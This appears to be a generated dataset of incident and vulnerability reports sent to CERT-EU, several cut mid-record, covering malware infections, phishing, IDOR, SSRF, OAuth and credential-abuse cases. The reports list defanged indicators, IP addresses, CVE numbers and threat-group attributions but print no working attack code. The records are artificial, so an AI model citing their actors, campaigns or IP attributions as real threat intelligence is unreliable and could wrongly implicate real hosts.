Specifically, we observed that the analytics tool’s OAuth implementation does not properly validate redirect URIs, which could allow for an open redirect or even token interception if exploited. \n\nThe issue was initially detected on 3 July 2024, while testing custom dashboards for investment optimization. Our security logs indicate that the analytics tool accepts arbitrary redirect_uri parameters during the OAuth flow, enabling an attacker to potentially capture access tokens by redirecting users to a malicious endpoint. No exploitation has been observed so far, but the risk is considerable given the sensitivity of investment data processed by the CRM.\n\nWe have attached a technical report (oauth_redirect_validation_issue.pdf) detailing our findings, including step-by-step reproduction instructions and sample HTTP requests. In line with NIS2 and GDPR compliance, we have temporarily restricted integrations with the affected analytics platform pending further investigation.\n\nWe request CERT-EU’s guidance on coordinated disclosure to the vendor and any recommendations for immediate risk mitigation.

One user (Dr. Conti) reported that her session terminated unexpectedly and she was logged out, even though she hadn’t touched anything.\n\nOur local IT support checked the system and found a PowerShell script executing from C:\\Users\\Public\\lib\\update_cache.ps1, which is not something we recognize or have deployed. The process tree (from Sysmon) shows the script being launched by a parent process called msedge.exe, which I guess is the Edge browser? We don’t normally allow Edge to run scripts, so that’s odd.\n\nIn the event logs, there are multiple entries for outbound connections to IP 217.160.48.119 over TCP/8088, initiated by PowerShell. The script itself tries to download a file named update.exe from hxxp://cdn-eu1[.]fileshare[.]eu/downloads/ and then creates a scheduled task called “CacheUpdater”.\n\nWe immediately disconnected the workstation from the lab network and ran a basic AV scan (Windows Defender), which detected ‘Trojan:Win32/Emotet.B’ and quarantined update.exe, but I’m not sure if that’s the end of it. No other workstations in the immediate vicinity are showing alerts yet, but I’m worried about lateral movement or data loss. The shared folder D:\\Projects\\EU-BioData\\ is accessible from this host and contains project files for the EU-wide research collaboration, some of which are confidential.\n\nWe’ve collected relevant logs (Sysmon, Windows Event Viewer, Defender logs), and I’m attaching a sample here (‘bio-analyt05_logs_20240715.zip’). Our IT said they saw attempts to create new local user accounts (user: temp_svc) right before we unplugged the device.\n\nWe’re not sure how the script got there – Dr. Conti mentioned she downloaded a PDF from an external conference site earlier in the day, but nothing looked suspicious. No suspicious emails reported either.\n\nPlease advise on next steps: should we reimage the workstation? Do we need to scan other lab PCs, or notify project partners? We’re a bit out of our depth on this, so any help is appreciated. Let us know if you need more details or remote access.\n\nThanks in advance for your help,\n\nBest,\n\nSara Bellini\nLab Coordinator\nJoint Research Centre (JRC) – Ispra, Italy\nsara.bellini@jrc.it", "created_date": "2024-10-11T00:00:00", "email_address": "sara.bellini@jrc.it", "llm_queue": "DFIR::incidents"}

Over the past week, our research group at KU Leuven has been tracking a new ransomware affiliate recruitment thread on a Russian-language forum (see attached screenshots, TLP:GREEN). The actor, using the alias “cyberCossack”, is advertising access to compromised EU municipal networks, specifically mentioning Belgian and Dutch city councils.

Despite several remediation attempts—including full software reinstalls, profile resets, and validation of OS integrity—the issue remains unresolved and appears to be spreading incrementally to additional endpoints.\n\nInitial telemetry analysis suggests that the affected applications are being terminated abruptly, with event logs showing anomalous DLL injections and unexpected child process spawns shortly before each halt. Notably, several crash reports reference the loading of unsigned modules from the user’s temp directory, and in at least three cases, we identified outbound traffic to defanged domains such as hxxps://aud-update[.]syncserve[.]net and hxxps://skp-connect[.]relaymail[.]org.

The file isn't signed and doesn't match any known hashes in our threat intel feeds.\n- Reviewing [Sysmon] EventID 3, there's outbound SMB traffic to an external IP (46.36.221.112) right after the failed RDPs.

We are currently preparing for the scheduled external network penetration test of our public-facing infrastructure, in accordance with our annual risk assessment cycle and NIS2 obligations. The engagement is set to begin on 2 July and run through 5 July, with all test traffic originating from the IP range 198.51.100.32/28 as previously agreed.\n\nAs part of the pre-engagement planning phase, we have encountered an issue that requires your input before proceeding. Specifically, our team is unable to validate the readiness of our new Secure Remote Access Gateway (SRAG) for inclusion in the scope of the test. The SRAG (hosted at hxxps://remote.eesc.europa.eu) was recently deployed to replace our legacy VPN solution, and while initial configuration reviews suggest compliance with baseline security standards, we have not yet completed a full audit of the access control policies and multi-factor authentication (MFA) integration.\n\nGiven the gateway’s critical role in facilitating remote access for staff and external partners, we are concerned about the risk of inadvertent service disruption or exposure of sensitive authentication flows during the active penetration test. We would appreciate your guidance on the following points:\n\n1. Can the SRAG be safely included in the initial test scope, or would you recommend a phased approach (e.g., initial reconnaissance only, with exploitation attempts deferred until post-MFA audit)?\n2. Are there specific artefacts or configuration exports we should provide to facilitate risk-aware testing (e.g., sanitized policy configs, sample authentication logs)?\n3. Would it be possible to schedule a short pre-test call to clarify the engagement boundaries and agree on real-time communication channels for incident response?\n\nWe have attached a summary of the current SRAG configuration (see: SRAG_Config_Summary_20240625.pdf) for your reference.

The process was launched by the SYSTEM account and subsequently initiated multiple outbound connections to the external IP address 91.207.58.12, which is not recognized as part of our trusted network perimeter.\n- Concurrently, Sysmon logs captured several PowerShell script executions leveraging encoded command parameters. One of the scripts attempted to enumerate user sessions and extract data from a mapped network share containing pseudonymised patient datasets (directory: \\\\research-nas\\patient_data2024).\n- We also observed a spike in outbound traffic volume between 03:42 and 03:46 CET, with a significant portion directed to hxxps://meddata-transfer[.]pro. The destination domain is not on our allowlist and is flagged by Threat Intelligence feeds as potentially malicious.\n\nPreliminary Analysis:\n- The server in question was running outdated Windows Server 2016 patches, and our vulnerability scanner had previously flagged it for missing KB5024286 (May 2024 cumulative update). Initial review suggests possible exploitation of CVE-2024-21338 (Win32k privilege escalation).\n- Our internal SIEM (Elastic Stack) indicates that SYSTEM privileges were used to access and attempt to compress several large CSV files from the patient data share, but we have not yet confirmed full data exfiltration.\n- Authentication logs show failed login attempts from the same external IP prior to the binary execution, targeting the 'svc_medadmin' service account.\n\nActions Taken So Far:\n- Isolated medrec-02 from the internal network and disabled the affected service account.\n- Collected volatile memory and disk images for forensic preservation (see attachments: 'medrec02_memdump.bin', 'sysmon_events_20240620.log').\n- Informed the Data Protection Officer for preliminary GDPR assessment, given the sensitivity of the datasets involved.\n\nAssistance Requested:\n- Urgent review of attached forensic artefacts to confirm method of compromise and assess potential data exfiltration scope.\n- Guidance on notification requirements under NIS2 and any immediate remediation steps you recommend.\n- Coordination with relevant law enforcement if external actors are confirmed.\n\nPlease confirm receipt of this report and indicate if additional information is required.

The issue was first noticed when several scheduled posts failed to publish, and diagnostic logs indicated repeated authentication errors and unexpected API calls to unfamiliar endpoints (see attached network trace extract).\n\nTechnical Details:\nUpon investigation, we discovered that the affected integration modules (specifically, the 'EuroSocial' connector v3.2.7) were making outbound connections to hxxps://api-social-sync[.]org and hxxps://cdn-metrics[.]net, neither of which are part of our approved service list. These endpoints have been associated in recent CTI reports (ref: MISP event #2741, TLP:AMBER) with a campaign attributed to the \"Blue Antelope\" threat group, known for targeting EU institutional branding assets.\n\nInitial remediation steps included:\n- Restarting the impacted campaign management servers\n- Rolling back to previous plugin versions\n- Blocking outbound traffic to the identified suspicious domains at the firewall level\n\nDespite these actions, we continue to observe attempted connections and sporadic service interruptions, raising concerns about persistence mechanisms or additional compromised components. The incident currently impacts several ongoing EU-wide awareness initiatives, with potential reputational risk if campaign messaging is further disrupted or manipulated.\n\nAssistance Requested:\nWe are seeking:\n- Any intelligence you may have regarding recent Blue Antelope activity or associated infrastructure\n- Enrichment of the attached IOC list (IPs, domains, plugin hashes)\n- Guidance on further containment and monitoring steps, especially in line with NIS2 requirements for digital service providers\n\nFor your reference, attached is a zipped archive containing relevant server logs, a CSV of observed suspicious connections, and the affected plugin binaries for malware analysis. All information is shared under TLP:AMBER, and we are prepared to provide additional artefacts if required.\n\nPlease advise on any sector-specific advisories or trends relating to supply chain compromise via digital marketing integrations. Your timely input is appreciated to help ensure the integrity of our institutional communications.\n\nBest regards,\n\nMarco Lemaire\nCyber Threat Analyst\nDG CONNECT, European Commission", "created_date": "2024-09-05", "email_address": "marco.lemaire@ec.europa.eu", "llm_queue": "CTI"}

We’ve run into something odd this afternoon (09/07/2024, around 14:20 CET) on one of our analyst workstations (hostname: EUROPOL-WS12). One of our junior staff, Petra Novak, reported her laptop being unusually slow and the fan running at max, even though she was only using Outlook and our case management system.\n\nWhen I remoted in, I saw a suspicious process in Task Manager (powershell.exe running as SYSTEM), which kept popping back up even after being killed.

The outbound connection is blocked by our firewall now, but not before several attempts were logged. Our EDR (CrowdStrike) flagged this as a possible fileless malware infection, but hasn’t quarantined anything yet. No obvious signs of lateral movement, but a couple of other hosts (EUROPOL-WS09 and WS14) show similar command lines, so this might be spreading.\n\nImmediate steps we’ve taken:\n- Isolated the affected workstations from the network\n- Disabled the user accounts on those machines as a precaution\n- Grabbed full memory dumps and exported the relevant [Sysmon] logs (attached)\n\nWe haven’t found any evidence of data exfiltration so far, but we’re not sure what the payload does yet.

The system flagged a sequence of anomalous activities on domain controller 'eu-parl-ad03.strasb.intra' at approximately 04:26 CET this morning (see attached event extract below).\n\nInitial detection came via a triggered rule for 'unusual LSASS memory access' by a non-standard administrative account ('adm-bernard'). This account was only recently provisioned and, according to our records, should not be in use outside scheduled maintenance windows (which ended at 02:00 CET). The process tree indicates use of a renamed PowerShell binary ('pwsh-upd.exe'), launching a series of scripts with encoded commands.

I’m not a security specialist, but after discussing with our local IT support, we thought it best to forward this to your team for proper assessment.\n\nThe issue: when accessing certain archived reports, users are able to modify the document metadata (like author and timestamp) even though these records are supposed to be read-only. This seems to happen if you change the document ID parameter in the URL (e.g., dms.ecoaud[.]eu/view?id=XXXX). There’s no authentication prompt or warning – just direct access and edit capability. We haven’t tried anything too technical, but it looks like anyone logged into the system can alter metadata for any document, not just their own.\n\nI’ve attached a couple of screenshots showing before/after states and the URL pattern. No special tools used, just Chrome and Firefox. We’re concerned this could be a case of insecure direct object reference (IDOR), but again, not experts here.\n\nNo evidence of misuse so far, but with the sensitive nature of audit documents, we’d appreciate guidance on next steps.

This coincided with the deployment of a recent vendor firmware update. Since then, the cleaning automation service has experienced repeated outages, resulting in service delays and a backlog of unscheduled maintenance tasks. \n\nPreliminary analysis of the API logs (attached in CSV format) revealed multiple access attempts originating from non-whitelisted internal IPs (192.168.24.112, 192.168.24.131) and an unexpected outbound connection attempt to hxxps://autoclean-status[.]eu-robotics[.]org. These IPs are not assigned to the robotics subnet, and the destination domain is unrecognised by our supplier. Our endpoint telemetry further suggests potential exploitation of the API update mechanism, possibly leveraging a known vulnerability (CVE-2024-18842, API authentication bypass, CVSS 8.2). \n\nActions taken so far:\n- Immediate restart of the affected server and temporary network segmentation of the robotics control VLAN\n- Review of recent API and system logs (sample attached)\n- Contacted the vendor for firmware integrity validation (awaiting response)\n\nRequest:\nGiven the risk of supply chain compromise and the unusual outbound traffic, we would appreciate your support with the following:\n1. Correlation of the attached indicators (IPs, domain, sample log extracts) with any ongoing campaigns targeting EU smart building infrastructure\n2.

I am reaching out from the IT Security Division of the European Court of Auditors regarding a concerning development identified during our routine threat hunting exercises. Over the past week, our team has detected a sequence of targeted attempts to exploit a known SAP vulnerability (CVE-2024-21734) within our SAP ERP Central Component 6.0 instance. The observed activity appears to be part of a wider campaign, which we have internally codenamed 'Blue Ledger'.\n\nOur telemetry indicates multiple inbound connection attempts from a cluster of IPs predominantly geolocated in Eastern Europe, attempting to access unauthorised endpoints associated with the SAP NetWeaver Application Server. The attackers leveraged HTTP POST requests containing suspicious payloads that closely match known exploitation patterns for this vulnerability (MITRE ATT&CK T1190: Exploit Public-Facing Application).\n\nWe have correlated these events with recent advisories shared by ENISA and observed several overlapping indicators, including the following defanged IPs and domains:\n- 185.245.86[.]133\n- 194.87.231[.]59\n- hxxps://sap-auth-sync[.]ru\n\nAdditionally, our SIEM flagged outbound traffic to hxxps://sap-license-check[.]net shortly after the exploitation attempts. While we have implemented immediate containment measures (blocking related IPs, patching the affected SAP component, and reviewing privileged accounts), we are concerned about the possibility of further lateral movement or credential theft, given the attackers' persistence.\n\nAttached you will find a zipped archive containing:\n- Enriched IOC list in STIX 2.1 format\n- Relevant SAP application logs (redacted for sensitive data)\n- A short technical summary of our incident response actions to date\n\nWe kindly request CERT-EU’s assistance in:\n1.

Over the past 48 hours, several staff members have reported persistent login failures when accessing our internal analytics dashboard. While initial troubleshooting suggested possible browser compatibility issues, further review of our authentication logs revealed a sequence of failed login attempts originating from IP ranges previously flagged in EU threat advisories (notably, ASN 20473 and 9009, both linked to recent APT activity targeting European governmental bodies).\n\nOur security team has observed that these attempts are often accompanied by user-agent strings mimicking outdated browser versions (e.g., Chrome/58.0, Firefox/52.0), likely in an effort to evade modern security controls and trigger fallback authentication mechanisms. We have also identified anomalous POST requests to the dashboard’s SSO endpoint, with payloads matching patterns seen in credential phishing kits attributed to the \"Sandvine Owl\" actor group (per ENISA TLP:AMBER bulletin, May 2024).\n\nWe have attached a redacted log extract (see attachment: parliament_dashboard_auth_failures_20240624.csv) containing:\n- Timestamps of suspicious login attempts\n- Source IPs (defanged)\n- User-agent strings\n- Correlation with known phishing infrastructure (where available)\n\nAt this stage, no successful compromise has been confirmed, but the persistence and sophistication of the attempts suggest a coordinated reconnaissance phase.

These nodes are now predominantly hosted on previously dormant subnets belonging to a Luxembourg-based VPS provider (AS21043), with fresh domains registered as of 2024-05-17 (e.g., foxhub-ctrl[.]org, bramblelink[.]eu).\n- Traffic analysis indicates increased beaconing from endpoints in multiple central European ministries (notably Czechia, Austria, and Slovakia), with C2 communication using custom HTTP headers (\"X-Fox-Relay: v3.8\"). We correlated several of their provided SHA256 hashes (see attached) with recent submissions to VirusTotal—none have public detection yet.\n- Notably, the botnet is leveraging a novel DGA pattern (daily 6-letter combos appended to the domain root) and a new persistence mechanism involving scheduled tasks named \"SystemFoxUpd\". The academic team also shared PCAPs of the initial handshake sequence (available upon request; let us know if you want these).\n- Our own sensors picked up related outbound traffic from a government procurement portal (hostname redacted for confidentiality) last week, matching the same C2 patterns. We’re working to contain the incident and would appreciate any additional intelligence you may have on BrambleFox actor attribution or related campaigns.\n\nPlease advise if you need the raw MISP dump or PCAPs for deeper analysis.

Our internal logs indicate sporadic spikes in network traffic and a series of failed authentication attempts from unfamiliar IP ranges, which could suggest the presence of a denial-of-service (DoS) or brute-force attack vector targeting the analytics infrastructure.\n\nTo ensure compliance with NIS2 and our internal risk management framework, we are requesting an external penetration test focused on:\n- Assessing the resilience of the platform against DoS and brute-force attacks\n- Identifying any misconfigured access controls or exposed administrative interfaces\n- Reviewing server resource allocation and authentication mechanisms for potential exploitation\n\nWe have attached the most recent incident logs (see: Analytics_Outage_Logs_June2024.zip) and a brief network topology overview for your reference. Please prioritise this engagement as the disruptions are impacting critical reporting deadlines. We would appreciate your confirmation of the earliest possible test window and any preparatory actions required from our side, such as whitelisting CERT-EU testing IPs or provisioning temporary test accounts.\n\nIf you require additional information or remote access to affected systems, please advise on the secure channel for credentials exchange.

As an analyst within the Directorate-General for Economic and Financial Affairs (DG ECFIN), I have noticed consistent anomalies in the investment projection outputs over the last several weeks.\n\nUpon further examination, it appears that the application’s results are being influenced by an insecure integration with a third-party open source library used for data processing (libfinanalyze v2.1.7). Specifically, I observed that untrusted input data from external market feeds is processed without adequate validation, creating a potential for injection-based manipulation of financial forecasts. Initial static code analysis revealed that certain API endpoints (notably /api/forecast/import) pass feed parameters directly into the data processing routines without sanitisation, making them susceptible to crafted payloads.\n\nThis flaw could allow an attacker with access to the market data feeds to introduce malicious inputs, potentially resulting in manipulated forecasting outputs, data integrity issues, or even code execution depending on the environment. To illustrate the risk, I have prepared a minimal proof-of-concept payload (see attached .txt and log extracts) that, when submitted through the affected endpoint, causes erroneous investment forecasts to be generated.\n\nGiven the criticality of accurate financial projections for EU policy decisions and the possible implications for compliance with NIS2 and internal risk management standards, I believe this warrants immediate review. Please let me know if you require additional details, sample payloads, or further technical evidence.

During a student-led review of the new EU Student Mobility App (mobility-app.europa-campus.eu), we stumbled on what appears to be a server-side request forgery (SSRF) in the document upload microservice. \n\nHere’s what we found: when uploading PDFs for exchange program applications, the backend endpoint at /api/v2/documents/upload accepts a ‘callbackUrl’ parameter in the POST body. It’s supposed to notify a trusted endpoint when processing is complete, but there’s no validation of the callback domain. We managed to point it at internal RFC1918 addresses and, with a bit of trial and error, got the server to fetch data from 10.22.1.15:8080 and return the response to our client. \n\nWe haven’t tried anything destructive—just simple GETs to see if the server would respond. No authentication bypass or data exfiltration attempted. Still, it looks like this could be chained with other issues for lateral movement or even internal service discovery. We tested from the university’s network, not from outside, but it seems like anyone with a valid student account could exploit this. \n\nOur PoC (curl and Postman scripts) and a couple of sanitized screenshots are attached.

The email is formatted with the EU flag and the Horizon Europe logo, but the formatting is slightly off (fonts and logo are a bit blurry). It asks users to click a link (defanged here: hxxps://eu-horizon-access[.]org/secure-update) to “validate your project access credentials.” The page it leads to is a copy of the Funding & Tenders Portal login, requesting full username, password, and 2FA code.

She didn’t click the link, but forwarded the email to me. I checked the headers (see attached .eml file) and noticed that the originating IP is 185.210.219.17, which is not associated with any EU infrastructure I’m aware of.

Specifically, SIEM (Splunk) flagged multiple failed and then successful login attempts from a previously unseen IP address (91.201.72.38, geolocated outside usual access regions) against two privileged service accounts: 'svc_data_etl' and 'svc_investment_report'.\n\nFollowing these logins, there was an immediate and sustained increase in database query volume, including complex SELECT and EXPORT statements targeting investment data tables (see partial [db_activity.log] excerpt below):\n\n2024-07-04T18:07:12Z | LOGIN SUCCESS | user: svc_data_etl | IP: 91.201.72.38\n2024-07-04T18:08:34Z | QUERY | user: svc_data_etl | EXPORT investment_data WHERE period > '2023-01-01'\n2024-07-04T18:10:01Z | LOGIN SUCCESS | user: svc_investment_report | IP: 91.201.72.38\n\nDespite patching and updating the analytics toolset (Q2 2024 release), the anomalous activity persisted, suggesting the issue is not related to software compatibility but rather a potential compromise of service account credentials or session hijacking. No relevant software errors were logged. Initial review of system integrity checks shows no signs of tampering with binaries, but several session tokens were observed to be re-used from the suspicious IP.\n\nGiven the sensitivity of investment data and possible implications under NIS2 and GDPR, we have already disabled the affected accounts and revoked all active sessions. Our internal investigation is ongoing, with focus on determining the extent of data accessed and whether any exfiltration occurred. We have preserved forensic images and relevant log files (see attached: 'ecfin-analytics-auth-incident-20240704.zip').\n\nWe request CERT-EU DFIR assistance for deeper forensic triage, identification of root cause (credential compromise vs. session abuse), and recommendations for containment and notification procedures.

During a routine review of web application logs (specifically from our promotional campaign management portal at promo-tools.ec.europa.eu), our SOC identified a cluster of suspicious SQL injection attempts targeting the ‘campaign_performance’ endpoint, which aggregates sales and engagement metrics for several branded products—including, notably, the SteelSeries Rival 3 Wireless Mouse campaign managed in Q2.\n\nThe intrusion attempts began on 10 July 2024 (first detected at 13:22 CET) and continued intermittently over the past 48 hours. All malicious requests originated from IP range 194.25.87.0/24, registered outside the EU, and included atypical user agents (e.g., 'sqlmap/1.5.12#stable'). The attackers submitted crafted payloads aiming to exfiltrate campaign effectiveness data, such as ROI breakdowns and partner attribution logs.

Earlier today, we received an automated alert from our Fortinet VPN gateway regarding multiple concurrent connections originating from outside the usual geo-locations for staff. The activity was flagged at 13:26 CET and appears to involve the user account 'federico.lombardi@europarl.europa.eu'.\n\nWhat stands out is that three sessions were established within seconds of each other, all using different source IPs (37.142.85.17, 185.54.101.33, and 212.60.190.91) located in regions not typically associated with Federico’s travel or remote work (Turkey, Moldova, and Norway, respectively). The user has confirmed by phone that he was not attempting to connect at that time and was in a meeting at our Brussels office.\n\nBelow is a snippet from the VPN logs for reference:\n\n[2024-07-16T13:26:18Z] Username: federico.lombardi@europarl.europa.eu | Src IP: 37.142.85.17 | Device: Win10-Laptop | Auth Method: 2FA (Push)\n[2024-07-16T13:26:21Z] Username: federico.lombardi@europarl.europa.eu | Src IP: 185.54.101.33 | Device: Unknown | Auth Method: 2FA (Push)\n[2024-07-16T13:26:23Z] Username: federico.lombardi@europarl.europa.eu | Src IP: 212.60.190.91 | Device: Win10-Tablet | Auth Method: 2FA (Push)\n\nOf concern: all three sessions were apparently granted access, but our DUO dashboard shows only a single 2FA approval. We’re worried there may be a flaw or exploit in the VPN’s 2FA integration, or that the user’s mobile device is compromised and approving pushes without his knowledge.\n\nImmediate actions we’ve taken:\n- Disabled federico.lombardi’s VPN access and forced a password reset\n- Initiated a full review of DUO logs for any other anomalies\n- Notified our SOC to monitor for lateral movement or suspicious resource access\n- Contacted the user to confirm no lost/stolen devices\n\nNo evidence yet of data exfiltration or internal resource misuse, but we’re still reviewing network traffic and file access logs. We’d appreciate your assistance with a deeper forensic review, especially to check for any indicators of session hijacking or 2FA bypass attempts. Please let us know if you need a full log export or if you’d like to coordinate a call with our network team.\n\nSorry for the slightly messy format—I'm sending this in a hurry as we want to get ahead of any potential breach.

While integrating a new analytics module, we discovered a logic flaw in the way our backend handles CSV file uploads within the analytics dashboard (hxxps://analytics.eia[.]europa.eu/upload). Specifically, the input validation for uploaded files is insufficient, allowing attackers to craft CSV files containing malicious formulae (so-called \"CSV injection\").\n\nOur internal testing demonstrated that, if such a file is downloaded and opened by an analyst in Excel or LibreOffice, it could trigger arbitrary command execution or data exfiltration, depending on the local configuration.

While conducting routine maintenance on our predictive analytics platform (hosted within the EC’s Azure tenancy), I observed a malfunction in the data processing pipeline that, upon closer inspection, appears to be rooted in a misconfiguration of access controls within our cloud infrastructure.\n\nSpecifically, our data analytics tool (leveraging a managed Keras instance integrated with multiple external data sources via Airtable connectors) is inadvertently exposing sensitive project datasets to unauthorised service principals. This was initially noticed when several automated investment projection tasks failed, prompting me to review both the Keras service logs and the associated Airtable API permissions. \n\nUpon analysis, I found that the OAuth scopes assigned to the Airtable integration were overly broad, granting read/write access to all tables within the workspace rather than restricting access to only the required datasets. Additionally, the Keras instance was running under a service principal with contributor-level permissions across the entire resource group, instead of the intended limited access. These misconfigurations create a risk of data leakage or unauthorised modification, especially if any of the external connectors are compromised or misused.\n\nI have temporarily revoked the unnecessary permissions and isolated the affected service accounts, but a thorough review and remediation is required to ensure compliance with NIS2 and GDPR obligations.

This issue first manifested as repeated crashes of several Ubuntu 22.04 LTS nodes, coinciding with abnormal process behavior and unexpected system resource exhaustion during scheduled batch jobs.\n\nInitial triage by our infrastructure team suggested a possible compatibility issue with our distributed computing platform (Apache Spark, version 3.4.0). However, after reinstalling the entire application stack and performing clean system restarts, the instability persisted. Further forensic analysis revealed several suspicious binaries and cron jobs introduced outside of our usual deployment workflows, raising concerns about potential exploitation via a third-party Spark plugin recently added to our environment.\n\nMalware analysis of the dropped binaries (see attached: suspected_loader_ubuntu_sample.zip, password: parliament2024) indicates strong code overlap with the \"LemonDuck\" Linux variant, specifically targeting Hadoop/Spark clusters for crypto-mining and lateral movement. Our endpoint telemetry shows outbound connections to hxxps://api-taskmgr[.]com and hxxp://45.77.39[.]201:3333, consistent with previously documented C2 infrastructure (MITRE ATT&CK T1496: Resource Hijacking, T1071: Application Layer Protocol).\n\nWe have contained affected nodes and isolated the Spark plugin in question, but we suspect initial compromise may have originated from a supply chain attack on a public plugin repository (see IOC list in attached parliament_lemonduck_iocs.csv).

These connections are consistently targeting a cluster of previously unassociated IP addresses in Eastern Europe (notably, 185.234.76[.]102 and 193.110.157[.]54) using non-standard ports (TCP/4572 and TCP/8810). For context, these servers host demo storefronts used for digital procurement simulations by multiple EU agencies.\n\nInitial traffic analysis and endpoint forensics suggest the presence of a modular botnet agent, which we have tentatively linked to the ongoing \"SilverStream\" campaign (as referenced in ENISA's Q1 2024 threat landscape update). The agent exhibits capabilities consistent with MITRE ATT&CK T1105 (Ingress Tool Transfer) and T1071.001 (Application Layer Protocol: Web Protocols), including:\n- Downloading and executing additional payloads\n- Exfiltrating limited system metadata (hostnames, OS versions)\n- Establishing persistent C2 channels disguised as legitimate e-commerce traffic\n\nEnclosed you will find:\n- A zipped CSV containing observed C2 IPs, associated domains (e.g., hxxps://shop-update[.]pro), and SHA256 hashes of the suspected agent binaries (collected from infected VMs)\n- A brief technical report summarising detection timelines, infection vectors (initial access likely via outdated plugin vulnerabilities), and containment measures implemented so far\n\nGiven the targeting of e-commerce simulation environments—potentially as a precursor to broader attacks on procurement platforms—we kindly request:\n1.

We’ve observed a significant uptick in anomalous outbound traffic patterns originating from compromised endpoints in both the public and private sectors since late last week.\n\nThe campaign appears to be orchestrated via a new variant of the \"GaleForce\" botnet, first detected in our honeypots on 24 July. Initial indicators include persistent beaconing to a cluster of fast-changing IPv6 addresses (sample: 2a02:6b8:0:1::a19b:2c1f) and DNS queries for subdomains under “syncmaster-net[.]org”. The C2 protocol uses non-standard ports (mostly 56782/tcp and occasionally 41414/udp), and packet inspection shows obfuscated payloads with XOR encoding (key varies per session, see attached PCAP excerpt).\n\nOur internal telemetry (via Suricata and Zeek sensors) suggests the infection vector may involve malicious macro-laden Excel files distributed through a recent phishing wave, though we’re still correlating delivery methods. We have attached a preliminary IOC list (IPs, domains, SHA256 hashes of observed payloads) and a YARA rule for detection of the obfuscated C2 handshake.\n\nOf note, some endpoints in municipal networks are communicating with what appears to be a fallback C2 hosted on a VPS registered in Romania (IP: 185.107.56.211). The same infrastructure was briefly observed hosting a malicious APK earlier this month, but that sample’s TTPs differ from the current activity. Attribution is tentative, but there are overlaps with TTPs previously seen in campaigns attributed to \"OrionSpider\" (MITRE ATT&CK T1095, T1071.004).\n\nWe’re still analyzing the scope, but so far no evidence of data exfiltration. However, given the rapid infrastructure changes and cross-border nature, we suspect the botnet may be pivoting to target additional EU entities.\n\nWe’d appreciate:\n- Cross-checking the attached IOCs against your telemetry for similar C2 patterns\n- Any enrichment on the syncmaster-net[.]org domain or related IPv6 addresses\n- Feedback on detection efficacy of the provided YARA rule\n\nApologies for any formatting glitches—typed this up quickly between calls. Please let us know if you need raw samples or further technical detail. We’ll send a more formal report as the investigation progresses.\n\nBest regards,\n\nJacek Nowak\nThreat Intelligence Analyst\nCERT Polska\njacek.nowak@cybersec.gov.pl", "created_date": "2025-04-09T00:00:00", "email_address": "jacek.nowak@cybersec.gov.pl", "llm_queue": "CTI"}

I’m not a professional pen tester, but as part of our coursework, we were asked to review public-facing EU digital services for common web security issues and report anything significant. I hope this is the right place to send such findings—please let me know if there’s a more appropriate channel.\n\nDuring my review, I noticed that the wallet’s account recovery process (specifically the endpoint at https://sandbox-idwallet.europa.eu/api/recover) does not enforce any rate limiting or CAPTCHA after multiple failed attempts. I scripted a simple tool to submit repeated password reset requests for the same user ID (just using my own test account, not anyone else’s), and there didn’t seem to be any lockout or throttling, even after dozens of tries. I also observed that the error responses leak whether an email address is registered or not, which I think could help an attacker enumerate valid users.\n\nI didn’t try any further exploitation, but my understanding is that this might allow brute-force attacks or make the platform more susceptible to credential stuffing, especially if someone had access to breached password lists. I’m not sure if this is a known issue or if there are backend protections I can’t see, but from what I could test, it seems like a potential risk for user accounts, especially since the platform is meant to handle sensitive identity data.\n\nI’m attaching a PDF with a summary of my steps, some screenshots, and the simple script I used (it just uses curl, nothing fancy). Please let me know if you need more details or if I should share the test account credentials for verification.

Earlier this morning (25/06/2024, approx. 08:10 CET), several staff members in the finance department noticed irregularities in their monthly account statements, specifically unauthorised adjustments and unexplained charges appearing in the billing overview. Initial checks ruled out known technical issues or misconfigurations on our end.\n\nUpon closer inspection, our team discovered multiple suspicious logins to the billing portal (host: budget-billing.ec.europa.eu) from IP addresses outside our usual geofencing policy, notably from 92.38.149.210 and 178.62.12.45.

This report is submitted as a routine finding under the Coordinated Vulnerability Disclosure policy, in line with NIS2 compliance and our internal ICT risk management obligations.\n\nWhile reviewing the payment module integration (notably during onboarding for Mailchimp services), I discovered that the backend payment handler is susceptible to insecure deserialization when processing metadata associated with PayPal transactions.

This appears to affect both PayPal and credit card flows, though I have not confirmed impact on SEPA direct debit or bulk payment features.\n\nAttached is a technical summary (see: PaymentModule_Deserialization_Findings.pdf) outlining proof-of-concept payloads, affected endpoints, and a high-level risk analysis.

The sender address was 'security-alerts@eu-digital-portal[.]eu', which superficially resembles an official domain but does not match any known internal contacts.\n\nThe message claims that urgent security updates are required due to 'recent NIS2 compliance changes' and instructs recipients to download a 'critical patch' via a provided link (defanged here: hxxps://eu-analytics-security[.]com/update). The email threatens restricted access to investment optimization tools if the action is not taken within the next 2 hours. Unfortunately, one colleague reports clicking the link and attempting to run the downloaded file, after which our analytics system experienced an abrupt outage.

I’m not a technical person—just the admin for our research groups, but this seemed significant, so I wanted to report it in case it affects others or if we’re missing something in our own setup.\n\nSo, a few days ago, one of our visiting fellows mentioned she was seeing someone else’s draft research documents when clicking certain direct links from our notification emails. At first, I thought maybe she’d been added to the wrong group, but after some poking around (and honestly, a bit of guessing URLs), I noticed that by modifying the document ID at the end of a ScholarShare link, I could access other users’ drafts, notes, and sometimes even attached datasets—no login prompt, no access denied message, nothing. \n\nThe links look like this: scholarshare.eui.eu/documents/view/##### (five-digit number changes per document). If you just increment the number, you get someone else’s file. I was able to see the titles, full text, and in one case, an Excel sheet with what looked like participant contact info from a research survey. I didn’t try to download anything after that because I wasn’t sure what the policy is, and I didn’t want to cross any lines.\n\nI checked with our local IT support, but they said they’d need to escalate because they aren’t familiar with ScholarShare’s backend or permissions system. They suggested I contact CERT-EU as per the vulnerability reporting guidelines we have. I have not shared these findings outside our team, and to my knowledge, no one else has exploited this on purpose.\n\nAs a non-tech admin, I don’t have logs or deep technical details, but I’m happy to help with recreating the steps or connecting you to our IT folks if needed. I think this may be a case of missing access controls (is that called an IDOR?), but I leave that to your expertise. We’d appreciate advice on next steps and whether this needs to be disclosed more widely, since EUI partners with other EU institutions and external universities who might also be using ScholarShare or similar systems.\n\nThank you for your guidance and for keeping us safe!\n\nBest regards,\n\nIsabella Rossi\nGroup Admin – School of Transnational Governance\nEuropean University Institute\nisabella.rossi@eui.eu", "created_date": "2025-01-14T00:00:00", "email_address": "isabella.rossi@eui.eu", "llm_queue": "OFFSEC::CVD"}

